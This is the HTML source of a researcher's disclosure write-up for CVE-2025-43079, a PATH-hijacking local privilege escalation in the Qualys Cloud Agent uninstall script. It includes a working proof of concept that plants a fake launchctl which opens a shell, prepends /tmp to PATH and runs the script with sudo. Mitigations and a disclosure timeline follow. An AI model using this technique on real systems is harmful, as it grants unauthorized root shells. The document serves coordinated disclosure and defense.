<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>CVE-2025-43079 — Local Privilege Escalation via Qualys Cloud Agents | Brent Zaltsman</title>
  <meta name="description" content="Research write-up for CVE-2025-43079: Local Privilege Escalation via qagent_uninstall.sh Qualys Cloud Agents">
  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.7.2/css/all.min.css">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism-tomorrow.min.css" />
  <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" defer></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-bash.min.js" defer></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-shell-session.min.js" defer></script>

  <style>
    :root {
      --accent: rgb(204,161,255);
      --bg: #f9f9fb;
      --text: #121212;
      --subtext: #555;
      --code-bg: #fff;
      --border: #ddd;
    }

    body {
      margin: 0;
      padding: 0;
      background: var(--bg);
      font-family: 'Poppins', sans-serif;
      color: var(--text);
      line-height: 1.75;
      overflow-x: hidden;
    }

    header {
      position: sticky;
      top: 0;
      z-index: 100;
      background: #fff;
      border-bottom: 1px solid var(--border);
      padding: 1.2rem 2rem;
      display: flex;
      justify-content: space-between;
      align-items: center;
    }

    header .logo {
      font-weight: 600;
      font-size: 1.3rem;
      color: #000;
    }

    header .highlight {
      color: var(--accent);
    }

    header .nav-links {
      display: flex;
      gap: 1.5rem;
    }

    header .nav-links a {
      color: #000;
      font-weight: 400;
      transition: color 0.2s ease-in-out;
    }

    header .nav-links a:hover {
      color: var(--accent);
    }

    main {
      max-width: 850px;
      margin: 5rem auto;
      padding: 0 1.5rem 4rem;
    }

    .back {
      display: inline-block;
      margin-bottom: 1.5rem;
      font-size: 0.95rem;
      color: var(--subtext);
      transition: color 0.2s ease;
    }

    .back:hover {
      color: var(--accent);
    }

    h1 {
      font-size: 1.9rem;
      font-weight: 600;
      margin-bottom: 0.3rem;
    }

    .meta {
      color: var(--subtext);
      font-size: 0.95rem;
      margin-bottom: 2rem;
    }

    h2 {
      font-size: 1.25rem;
      font-weight: 600;
      margin: 2rem 0 0.75rem;
      color: #000;
    }

    p {
      margin-bottom: 1rem;
      font-size: 1rem;
    }

    a {
      color: var(--accent);
      text-decoration: none;
    }

    a:hover {
      text-decoration: underline;
    }

    code {
      background: var(--code-bg);
      border: 1px solid var(--border);
      padding: 0.15rem 0.4rem;
      border-radius: 0.3rem;
      font-family: monospace;
      font-size: 0.95rem;
    }

    pre {
      background: var(--code-bg);
      border: 1px solid var(--border);
      border-radius: 0.5rem;
      padding: 1rem;
      overflow-x: auto;
      line-height: 1.6;
      font-size: 0.95rem;
    }

    pre > code {
      display: block;
      background: transparent;
      border: 0;
      padding: 0;
      white-space: pre;
    }

    ul, ol {
      margin-left: 1.2rem;
      margin-bottom: 1rem;
    }

    .note {
      background: var(--code-bg);
      border-left: 5px solid var(--accent);
      padding: 1rem 1.25rem;
      border-radius: 0.4rem;
      margin: 1rem 0;
    }

    main img {
      max-width: 100%;
      height: auto;
      display: block;
      border-radius: 8px;
      border: 1px solid var(--border);
      box-shadow: 0 6px 18px rgba(18,18,18,0.06);
      margin: 0.75rem 0;
      object-fit: cover;
    }

    footer {
      border-top: 1px solid var(--border);
      text-align: center;
      font-size: 0.9rem;
      color: var(--subtext);
      padding: 2rem 1rem;
    }

    @media (max-width: 768px) {
      main {
        margin-top: 4.5rem;
        padding: 0 1rem 3rem;
      }
      h1 {
        font-size: 1.6rem;
      }
      header {
        flex-direction: column;
        align-items: flex-start;
        gap: 0.5rem;
      }
    }
  </style>
</head>

<body>
  <main>
    <a class="back" href="/#publications"><i class="fa-solid fa-arrow-left"></i> Back to Publications</a>

    <h1>CVE-2025-43079: Local Privilege Escalation via Qualys Cloud Agents</h1>
    <p class="meta">
      by <strong>AfricanHipp0</strong> (<em>Brent Zaltsman</em>) · <time datetime="2025-11-12">12 November 2025</time>
    </p>

    <h2>TL;DR</h2>
    <p>
      The Qualys Cloud Agent bundles an uninstall script (<code>qagent_uninstall.sh</code>) for macOS/Linux that calls common utilities without absolute paths and without sanitising the process <code>$PATH</code>. If run with elevated privileges in a manipulated environment, attacker-controlled binaries can be executed in place of system tools (<a href="https://www.qualys.com/security-advisories/cve-2025-43079/" target="_blank">vendor advisory</a>).
    </p>
    <div class="note">
      <strong>Important clarification:</strong> “requires sudo” does <em>not</em> mean the user must be a root account. Many environments grant
      <em>per-command</em> <code>sudo</code> permissions via <code>sudoers</code>. A non-root user permitted to run this
      specific uninstall script with <code>sudo</code> can trigger the vulnerable path.
    </div>

    <h2>Background</h2>
    <p>
      The advisory describes a local issue where the uninstall script, when executed with elevated privileges and an attacker-influenced
      <code>$PATH</code>, may resolve unqualified commands to unintended binaries.
    </p>
    <p>
      Real-world macOS usage often looks like:</p>
      <p><code>sudo /Applications/QualysCloudAgent.app/Contents/MacOS/qagent_uninstall.sh</code> which is why per-command <code>sudo</code> for
      agent lifecycle is common in enterprise fleets.
    </p>

    <h2>What’s the bug?</h2>
    <ul>
      <li>Utilities (e.g., <code>rm</code>, <code>launchctl</code>) are invoked by name rather than absolute path.</li>
      <li>The script doesn’t reset to a safe <code>PATH</code> before those calls.</li>
      <li>If <code>$PATH</code> favours an attacker-writable directory, that binary executes with the script’s elevated privileges.</li>
    </ul>
    <p>Here is an example of the issue in action from the uninstall script:
      <pre><code class="language-bash">
pkgutil -
-forget com.qualys.cloud-agent
launchctl remove com.qualys.cloud-agent
launchctl remove com.qualys.edr
sleep 3
grep "console"
cut -d' '
-f1
security find-generic-password ...
pkill -SIGKILL ...
rm -rf ...
find ...
      </code></pre>
    </p>

    <h2>Exploitation requirements</h2>
    <ol>
      <li>Local access.</li>
      <li>Ability to run the uninstall script with elevated privileges — commonly via <code>sudo</code> permitted in <code>sudoers</code>. <em>Not</em> the same as being root.</li>
      <li>Ability to influence the process <code>$PATH</code>.</li>
      <li>Execution of <code>qagent_uninstall.sh</code> in that influenced environment.</li>
    </ol>

    <h2>Proof of Concept</h2>
    <p>1. As a non-root user, create a malicious launchctl in <code>/tmp</code>:
      <pre><code class="language-bash">
cat >/tmp/launchctl <<'EOF'
#!/bin/sh
echo "[+] PATH hijack triggered as UID=$(id -u) EUID=$(id -u)
USER=$(whoami)"
/bin/sh
EOF
chmod +x /tmp/launchctl
      </code></pre>
    </p>
    <p>2. Ensure <code>/tmp</code> is first in PATH:
      <pre><code class="language-bash">
export PATH="/tmp:$PATH"
      </code></pre>
    </p>
    <p>3. Run the uninstall script with sudo:
      <pre><code class="language-bash">
sudo /Applications/QualysCloudAgent.app/Contents/MacOS/qagent_uninstall.sh
      </code></pre>
    </p>
    <p>This runs the attacker-controlled <code>launchctl</code> with elevated privileges
      <img src="/assets/Uninstall.png" alt="Proof of Concept uninstall Screenshot">
      <div class="note">
        As you can see, this user does not have system-wide root privileges, but by running the uninstall script with sudo in a manipulated PATH, the malicious launchctl is executed with elevated rights.
      </div>
      <img src="/assets/pwn.png" alt="Proof of Concept pwn Screenshot">
    </p>

    <h2>Affected platforms</h2>
    <p>
      The issue concerns the uninstall script for <strong>macOS</strong> and <strong>Linux</strong> variants of the Qualys Cloud Agent.
      For exact version scope and latest status, see the
      <a href="https://www.qualys.com/security-advisories/cve-2025-43079/" target="_blank">vendor advisory</a>.
    </p>

    <h2>Mitigations &amp; fixes</h2>
    <ul>
      <li><strong>Update</strong> to the fixed agent when available; follow the advisory for version guidance.</li>
      <li><strong>Hardened invocation:</strong>
        <pre><code class="language-bash">sudo env -i PATH=/usr/bin:/bin:/usr/sbin:/sbin /path/to/qagent_uninstall.sh</code></pre>
      </li>
      <li><strong>sudoers policy:</strong> when granting per-command <code>sudo</code> for agent lifecycle, enable <code>env_reset</code> and set a
        <code>secure_path</code> to prevent untrusted <code>$PATH</code> entries during privileged execution.</li>
    </ul>

    <h2>On the advisory wording</h2>
    <p>
      I agree the risk manifests when the uninstall script runs with elevated privileges. My emphasis:
      “requires sudo or root” is frequently misread as “must be the root user.” In practice, when a user needs to run elevated commands - they are often restricted to specific commands via <code>sudoers</code>. This means they can run certain scripts with <code>sudo</code> without being root, so non-root users with that permission can still trigger the vulnerability. The advisory could clarify this distinction better.
    </p>

    <h2>Disclosure timeline</h2>
    <ul>
      <li><strong>Discovery:</strong> External researcher (author).</li>
      <li><strong>Coordinated disclosure:</strong> Vendor acknowledged, prepared advisory.</li>
      <li><strong>Public advisory:</strong> Published —
        <a href="https://www.qualys.com/security-advisories/cve-2025-43079/" target="_blank">CVE-2025-43079</a>.
      </li>
    </ul>

    <footer>
      <p>© <script>document.write(new Date().getFullYear())</script> AfricanHipp0. This post reflects my technical analysis and operational context. Always consult the vendor advisory for the latest versioning and remediation specifics.</p>
    </footer>
  </main>
</body>
</html>
